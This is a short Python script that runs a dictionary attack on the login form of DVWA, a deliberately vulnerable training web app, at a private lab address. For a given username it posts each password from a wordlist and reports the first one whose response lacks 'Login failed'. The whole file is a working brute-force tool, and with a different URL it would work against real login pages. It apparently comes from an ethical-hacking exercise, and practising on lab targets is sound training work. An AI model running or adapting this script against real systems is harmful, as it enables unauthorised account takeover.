#!/usr/bin/env python

import requests


target_url = 'http://10.0.2.21/dvwa/login.php'
data_dict = {'username': raw_input('username: '), 'password': '', 'Login': 'submit'}

with open('/root/Downloads/word_list/password_list.txt', 'r') as word_list:
    for line in word_list:
        word = line.strip()
        data_dict['password'] = word
        response = requests.post(target_url, data=data_dict)
        if 'Login failed' not in response.content:
            print('--->Password is: ' + word)
            exit()

print('process finished')
